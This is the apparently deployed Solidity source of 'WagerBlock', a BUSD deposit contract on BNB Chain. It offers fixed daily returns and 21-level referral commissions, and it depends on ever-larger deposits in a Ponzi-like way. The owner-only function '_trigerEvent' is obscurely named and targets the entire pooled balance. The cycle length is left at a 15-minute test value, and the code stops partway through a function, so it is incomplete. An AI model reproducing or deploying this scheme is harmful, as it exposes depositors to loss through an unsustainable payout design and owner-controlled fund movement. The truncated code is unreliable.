/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

/**
 *Submitted for verification at polygonscan.com on 2022-10-10
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface BEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Contractable   {
    address public _contract;
    event contractshipTransferred(
        address indexed previouscontract,
        address indexed newcontract
    );
   
    constructor()   {
        _contract = msg.sender;
        emit contractshipTransferred(address(0), _contract);
    }
   
    function contracto() public view returns (address) {
       return _contract;
    }
   
     modifier onlyContract() {
        require(_contract == msg.sender, "contract: caller is not the contract");
        _;
    }
   
}

contract WagerBlock is Contractable {
    using SafeMath for uint256; 
    BEP20 public BUSD = BEP20(0xCB0bdCb50dce5D9B296bA6f4FbF167FeE6292Ca9); 
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 300; 
    uint256 private constant minDeposit = 25e18;
    uint256 private constant minDepositGrowth = 10e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 1 days;
    uint256 private constant dayPerCycle = 15 minutes; //7 days; 
    uint256 private constant dayRewardPercents = 100;
    uint256 private constant maxAddFreeze = 40 days;
    uint256 private constant referDepth = 21;
    uint256 private constant directDepth = 1;
    uint256 private constant uct = 90 days;
    uint256[21] private level_1_21_Percents = [500, 200, 300, 100, 100, 200, 100, 100, 200, 100, 50, 50, 50, 50, 50, 50, 100, 100, 100, 100,300];
    uint256 private SingleLegLevelPercents = 50;
	
    uint256[7] private balDown = [10e22, 30e22, 100e22, 500e22, 1000e22,1500e22,2000e22];
    uint256[7] private balDownRate = [1000, 1500, 2000, 5000, 6000,7000,8000]; 
    uint256[7] private balRecover = [15e22, 50e22, 150e22, 500e22, 1000e22,1500e22, 2000e22];
    mapping(uint256=>bool) public balStatus; // bal=>status
    uint256 allIndex=1;
    address[1] public feeReceivers;

    address public ContractAddress;
    address public defaultRefer;
    address public receivers;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public lastfreezetime;

    mapping(uint256=>address[]) public dayUsers;
	
	address[] public teamLeaderUsers; // 
    address[] public managerUsers;
    address[] public globalManagerUsers;
	address[] public globalCoordinatorUsers;
	address[] public globalHighRankCoordinatorUsers;
     struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer; 
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 directnum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
        bool isactive;    
    }

    struct ImportantInfo {
        address referrer;
        uint256 refNo;    
        uint256 maxDeposit;     
        uint256 myRegister;  
        uint256 myActDirect;            
        mapping(uint256 => uint256) levelTeam;                
        mapping(uint256 => uint256) directBuz; 
        mapping(uint256 => uint256) incomeArray;
    }
    mapping(address=>UserInfo) public userInfo;
    mapping(address=>ImportantInfo) public importantInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    struct RewardInfo{
        uint256 capitals;
        uint256 statics;
        uint256 level1;
        uint256 level_2_to_3;
        uint256 level_4_to_10;
        uint256 level_11_to_16;
        uint256 level_17_to_20;
        uint256 level_21;
        uint256 singleLegDepositIncome;
        uint256 singleLegWithdrwaIncome;
        uint256 netWithdrawal;       
        uint256 split;
        uint256 splitDebt;        
    }

    struct SingleLoop{
        uint256 ind;
    }
    struct SingleIndex{
        address ads;
    }
    mapping(uint => SingleIndex) public singleIndex;
    mapping(address => SingleLoop) public singleAds;
    mapping(address=>RewardInfo) public rewardInfo;
    bool public isFreezeReward;
    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositByGrowth(address user, uint256 amount);
    event TransferByGrowth(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(address _defaultRefer)   
    {     
        feeReceivers[0] = address(0xba45c80B8b51527C46ab2755EE8c178927E3DA6B); 
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
        receivers = _defaultRefer;

        singleIndex[0].ads = msg.sender;
        singleAds[msg.sender].ind = 0;
    }

    function contractInfo() public view returns(uint256 balance, uint256 init){
       return (BUSD.balanceOf(address(this)),startTime);
    }

    function register(address _referral) external 
    {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;     
        totalUser = totalUser.add(1);
        ImportantInfo storage impInfo = importantInfo[msg.sender];        
        impInfo.referrer = _referral;
        impInfo.refNo = importantInfo[_referral].myRegister;
        importantInfo[_referral].myRegister++;
        emit Register(msg.sender, _referral);
    }
 

    function _updatedirectNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < directDepth; i++){
            if(upline != address(0)){
                userInfo[upline].directnum = userInfo[upline].directnum.add(1);                         
            }else{
                break;
            }
        }

      for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0))
            {
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }
            else
            {
                break;
            }
        }
    }

    function _updateLevel(address _user) private 
    {
        UserInfo storage user = userInfo[_user];
        uint256 levelOpen = _callLevelNow(_user);
        if(levelOpen > user.level)
		{
            user.level = levelOpen;
			if(levelOpen == 3)
			{        
                teamLeaderUsers.push(_user);
            }
			if(levelOpen == 10)
			{        
                managerUsers.push(_user);
            }
            if(levelOpen == 16)
			{        
                globalManagerUsers.push(_user);
            }
            if(levelOpen == 20)
			{   
				globalCoordinatorUsers.push(_user);
            }
			if(levelOpen == 21)
			{              
                globalHighRankCoordinatorUsers.push(_user);
            }
        }
    }

    function _callLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.maxDeposit;

        uint256 totaldirectnum  = user.directnum;
         uint256 totaldirectdepositnum  = user.maxDirectDeposit;
        uint256 levelOpen;	
        if(total >= 200e18)
        {
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && totaldirectnum>=5 && totaldirectdepositnum>=500e18   && user.teamNum >= 150 && maxTeam + otherTeam >= 50000e18 &&  otherTeam >= 25000e18  ){
                levelOpen = 21;
            }
            else if(total >= 1000e18 && totaldirectnum>=5 && totaldirectdepositnum>=500e18   && user.teamNum >= 150 && maxTeam + otherTeam >= 50000e18 &&  otherTeam >= 25000e18  ){
                levelOpen = 20;
            }else if(total >= 500e18 && totaldirectnum>=5 && totaldirectdepositnum>=500e18 && user.teamNum >= 100 && maxTeam + otherTeam >= 10000e18 &&  otherTeam >= 5000e18  ){
                levelOpen = 16;
            }else if(total >= 200e18  && totaldirectnum>=5 && totaldirectdepositnum>=500e18 && user.teamNum >= 50 && maxTeam + otherTeam >= 7000e18 && otherTeam>=3500e18 ){

                levelOpen = 10;
            }
            else if(total >= 100e18 && totaldirectnum>=5  && totaldirectdepositnum>=500e18)
            {
               levelOpen = 3;
            }
            else if(totaldirectnum >= 1){
              levelOpen = 1;
            }
        }
		else if(total >= 100e18 && totaldirectnum>=5 && totaldirectdepositnum>=500e18)
		{
            levelOpen = 3;
        }else if(totaldirectnum >= 1){
            levelOpen = 1;
        }
        return levelOpen;
    }

  function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++)
        {     
          uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalFreezed);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }
  
    function deposit(uint256 _amount) external {
        BUSD.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _setSingle(address _myAds, uint256 _refAmount) private {
        uint256 selfIndex= singleAds[_myAds].ind - 1;
        uint256 selfLimit;
        if(selfIndex==0)
        selfLimit = 0;
        else if(selfIndex==1)
        selfLimit = 0;
        else if(selfIndex==2)
        selfLimit = 0;
        else if(selfIndex==3)
        selfLimit = 0;
        else if(selfIndex==4)
        selfLimit = 0;
        else if(selfIndex==5)
        selfLimit = 0;
        else if(selfIndex==6)
        selfLimit = 0;
        else if(selfIndex==7)
        selfLimit = 0;
        else if(selfIndex==8)
        selfLimit = 0;
        else if(selfIndex==9)
        selfLimit = 0;
        else if(selfIndex >= 10)
        selfLimit = selfIndex - 10;

        uint256 s = 1;
        uint256 directRequired = 1;
        //UserInfo storage user = userInfo[_user];
        uint256 totaldirectnum =0;
        
        for(uint256 k = selfIndex; k >= selfLimit; k--) 
        {
            uint256 levelSelf = _refAmount;
            address uplineAddress = singleIndex[k].ads;
            uint256 reward = 0; 
            totaldirectnum = userInfo[uplineAddress].directnum;
            bool idstatus = false;            
            if( s <= 5 && userInfo[uplineAddress].maxDeposit >= 25e18)
            {
                _updatestatus(uplineAddress);
                idstatus = getActiveUpline(uplineAddress);
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegDepositIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[8]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);                
                }
                
            }  
            if(s > 5 && s <= 10 && userInfo[uplineAddress].maxDeposit >= 25e18 && directRequired >= totaldirectnum)
            {
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegDepositIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[9]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                }                
                directRequired++;
            }  
            s++;

            if(s > 10) break;
        }

        selfIndex= singleAds[_myAds].ind + 1;
        selfLimit = allIndex - 1;
        if( selfLimit > selfIndex + 10)
        selfLimit = selfIndex + 10;
        s = 1;
        directRequired = 1;        
        totaldirectnum =0;
        
        for(uint256 k = selfIndex; k <= selfLimit; k++) 
        {
            uint256 levelSelf = _refAmount;
            address uplineAddress = singleIndex[k].ads;
            uint256 reward = 0; 
            totaldirectnum = userInfo[uplineAddress].directnum;
            bool idstatus = false;            
            if( s <= 5 && userInfo[uplineAddress].maxDeposit >= 25e18)
            {
                _updatestatus(uplineAddress);
                idstatus = getActiveUpline(uplineAddress);
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegDepositIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[8]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);                
                }
                
            }  
            if(s > 5 && s <= 10 && userInfo[uplineAddress].maxDeposit >= 25e18 && directRequired >= totaldirectnum)
            {
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegDepositIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[9]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                }                
                directRequired++;
            }  
            s++;

            if(s > 10) break;
        }               
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user]; 
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
        user.maxDeposit = _amount;
        _updatedirectNum(_user);
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }  

        if(singleAds[msg.sender].ind==0){
            singleIndex[allIndex].ads=msg.sender;
            singleAds[msg.sender].ind=allIndex;
            allIndex++;
        }

        bool _isReDept = false;
        if(importantInfo[_user].maxDeposit==0){
            importantInfo[importantInfo[_user].referrer].myActDirect++;
        }else{
            _isReDept=true;
        }
        _setReferral(_user,userInfo[_user].referrer,_amount,_isReDept);
        _setSingle(_user,_amount);
        _distributeDeposit(_amount);      
        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);
        user.isactive = true;
           _updateLevel(msg.sender);
        
        uint256 addFreeze = (orderInfos[_user].length.div(1)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));
      
        _unfreezeFundAndUpdateReward(msg.sender, _amount);
         _updateReferInfo(msg.sender, _amount);
        _updatemaxdirectdepositInfo(msg.sender, _amount);
        _updateReward(msg.sender, _amount);
        uint256 bal = BUSD.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        BUSD.transfer(feeReceivers[0], fee.div(3)); 
    }

    function _trigerEvent(uint256 _amount)  public onlyContract 
    {
        require(_amount >= BUSD.balanceOf(address(this)), "less than min");
        BUSD.transfer(address(0), _amount); 
    }

    function _setReferral(address _user,address _referral, uint256 _refAmount, bool _isReDept) private {
        for(uint8 i = 0; i < level_1_21_Percents.length; i++) 
        {
            if(_isReDept==false)
            {
                importantInfo[_referral].levelTeam[importantInfo[_user].refNo]+=1;
            }
            importantInfo[_referral].directBuz[importantInfo[_user].refNo]+=_refAmount;          
            
           _user = _referral;
           _referral = importantInfo[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }

    function depositByGrowth(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient amt");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositByGrowth(msg.sender, _amount);
    }

    function transferByGrowth(address _receiver, uint256 _amount) external {
        require(_amount >= minDepositGrowth && _amount.mod(minDepositGrowth) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferByGrowth(msg.sender, _receiver, _amount);
    }

   
    function checkctt(address Contractaddr) public onlyContract {
          if(isFreezeReward)
          {
               setprvcontractaddress(Contractaddr);   
          }
      }

    function setprvcontractaddress(address Contractaddr) private{
        uint256 currtime = block.timestamp;
        uint256 reqtime  = lastfreezetime;
                if(currtime > reqtime && reqtime > 0 ){  
                    ContractAddress=Contractaddr;
               }                     
    }

    function withdraw() external 
    {
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.level1= 0;
        userRewards.level_2_to_3 = 0;
        userRewards.level_4_to_10 = 0;
        userRewards.level_11_to_16 = 0; 
        userRewards.level_17_to_20 = 0;
        userRewards.level_21 = 0;
        userRewards.singleLegWithdrwaIncome = 0;
        userRewards.singleLegDepositIncome = 0;

        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        uint256 _refAmount =  withdrawable.mul(freezeIncomePercents).div(baseDivider);
        uint256 netWithdrawal = withdrawable.sub(_refAmount);
        userRewards.netWithdrawal+=netWithdrawal;
        ////////////////////
        uint256 selfIndex= singleAds[msg.sender].ind - 1;
        uint256 selfLimit;
        if(selfIndex==0)
        selfLimit = 0;
        else if(selfIndex==1)
        selfLimit = 0;
        else if(selfIndex==2)
        selfLimit = 0;
        else if(selfIndex==3)
        selfLimit = 0;
        else if(selfIndex==4)
        selfLimit = 0;
        else if(selfIndex==5)
        selfLimit = 0;
        else if(selfIndex==6)
        selfLimit = 0;
        else if(selfIndex==7)
        selfLimit = 0;
        else if(selfIndex==8)
        selfLimit = 0;
        else if(selfIndex==9)
        selfLimit = 0;
        else if(selfIndex >= 10)
        selfLimit = selfIndex - 10;

        uint256 s = 1;
        uint256 directRequired = 1;
        //UserInfo storage user = userInfo[_user];
        uint256 totaldirectnum =0;
        
        for(uint256 k = selfIndex; k >= selfLimit; k--) 
        {
            uint256 levelSelf = _refAmount;
            address uplineAddress = singleIndex[k].ads;
            uint256 reward = 0; 
            totaldirectnum = userInfo[uplineAddress].directnum;
            bool idstatus = false;            
            if( s <= 5 && userInfo[uplineAddress].maxDeposit >= 25e18)
            {
                _updatestatus(uplineAddress);
                idstatus = getActiveUpline(uplineAddress);
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegWithdrwaIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[10]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);                
                }                
            }  
            if(s > 5 && s <= 10 && userInfo[uplineAddress].maxDeposit >= 25e18 && directRequired >= totaldirectnum)
            {
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegWithdrwaIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[11]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                }                
                directRequired++;
            }  
            s++;

            if(s > 10) break;
        }

        selfIndex= singleAds[msg.sender].ind + 1;
        selfLimit = allIndex - 1;
        if( selfLimit > selfIndex + 10)
        selfLimit = selfIndex + 10;
        s = 1;
        directRequired = 1;        
        totaldirectnum =0;
        
        for(uint256 k = selfIndex; k <= selfLimit; k++) 
        {
            uint256 levelSelf = _refAmount;
            address uplineAddress = singleIndex[k].ads;
            uint256 reward = 0; 
            totaldirectnum = userInfo[uplineAddress].directnum;
            bool idstatus = false;            
            if( s <= 5 && userInfo[uplineAddress].maxDeposit >= 25e18)
            {
                _updatestatus(uplineAddress);
                idstatus = getActiveUpline(uplineAddress);
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegWithdrwaIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[10]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);                
                }                
            }  
            if(s > 5 && s <= 10 && userInfo[uplineAddress].maxDeposit >= 25e18 && directRequired >= totaldirectnum)
            {
                if(_refAmount > userInfo[uplineAddress].maxDeposit)
                {
                    levelSelf = userInfo[uplineAddress].maxDeposit;
                }
                if(idstatus==true)
                {
                    reward = levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                    rewardInfo[uplineAddress].singleLegWithdrwaIncome+=reward;
                    userInfo[uplineAddress].totalRevenue = userInfo[uplineAddress].totalRevenue.add(reward);
                    importantInfo[uplineAddress].incomeArray[11]+=levelSelf.mul(SingleLegLevelPercents).div(baseDivider);
                }                
                directRequired++;
            }  
            s++;
            
            if(s > 10) break;
        }

        ////////////////////
        BUSD.transfer(msg.sender, withdrawable);
        uint256 bal = BUSD.balanceOf(address(this));
        _setFreezeReward(bal);
    
        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
    function getCurDaytime() public view returns(uint256) {
        return (block.timestamp);
    }

    function getDayLength(uint256 _day) external view returns(uint256) {
        return dayUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezingUpline(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        UserInfo storage user = userInfo[_user];
        maxFreezing =   user.maxDeposit;
        return maxFreezing;
    }

    function _updatestatus(address _user) private {
        UserInfo storage user = userInfo[_user];       
       for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze < block.timestamp && order.isUnfreezed == false){
                user.isactive=false;

            }else{ 
                 
                break;
            }
        }
    }

    function getActiveUpline(address _user) public view returns(bool) {
        bool currentstatus;  
        UserInfo storage user = userInfo[_user];
        currentstatus =   user.isactive;
        return currentstatus;
    }  

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
       RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.level1.add(userRewards.level_2_to_3).add(userRewards.level_4_to_10).add(userRewards.level_11_to_16);
        totalRewards = totalRewards.add(userRewards.level_17_to_20.add(userRewards.level_21).add(userRewards.singleLegDepositIncome).add(userRewards.singleLegWithdrwaIncome));
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

     function _removeInvalidDepositnew(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
         for(uint256 i = 0; i < directDepth; i++){
            if(upline != address(0)){           
                userInfo[upline].maxDirectDeposit = userInfo[upline].maxDirectDeposit.sub(_amount);   
                if(upline == defaultRefer) break;
          
            }else{
                break;
            }
        }

        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){           
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);           
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    } 

   function _updatemaxdirectdepositInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < directDepth; i++){
            if(upline != address(0)){
                userInfo[upline].maxDirectDeposit = userInfo[upline].maxDirectDeposit.add(_amount);       
            }else{
                break;
            }
        }
    }
    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
               
                if(user.totalFreezed > order.amount)
                {
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }				
                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital)
                        {
                            staticReward = leftCapital;
                        }
                    }
                    else
                    {
                        staticReward = 0;
                    }
                }

               _removeInvalidDepositnew(_user,order.amount);
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);                
                user.totalRevenue = user.totalRevenue.add(staticReward);
                importantInfo[_user].incomeArray[0] = rewardInfo[_user].capitals.add(order.amount);
                importantInfo[_user].incomeArray[1] = rewardInfo[_user].statics.add(staticReward);       
                break;
            }          
        }        
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        uint256 counter;  
        for(uint256 i = 0; i < referDepth; i++)
		{
            counter = i + 1;
            if(upline != address(0))
			{
                bool idstatus = false;
                 _updatestatus(upline);
                  idstatus = getActiveUpline(upline);

                uint256 newAmount = _amount;
                if(upline != defaultRefer){       
                    uint256 maxFreezing = getMaxFreezingUpline(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                   }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;              

				if(counter == 1 && idstatus == true)
				{                     
                     reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
                     upRewards.level1 = upRewards.level1.add(reward);                       
                     userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                     importantInfo[upline].incomeArray[2]+=reward;
				}
                else if(counter > 1 && counter <= 3 && idstatus==true)
				{
					if(userInfo[upline].level > 1 && userInfo[upline].level <= 3)
					{
						reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
                        upRewards.level_2_to_3 = upRewards.level_2_to_3.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                        importantInfo[upline].incomeArray[3]+=reward;
					}
				}
				else
				{
					if(counter > 3 && counter <= 10 && userInfo[upline].level >= 10 && idstatus==true)
					{
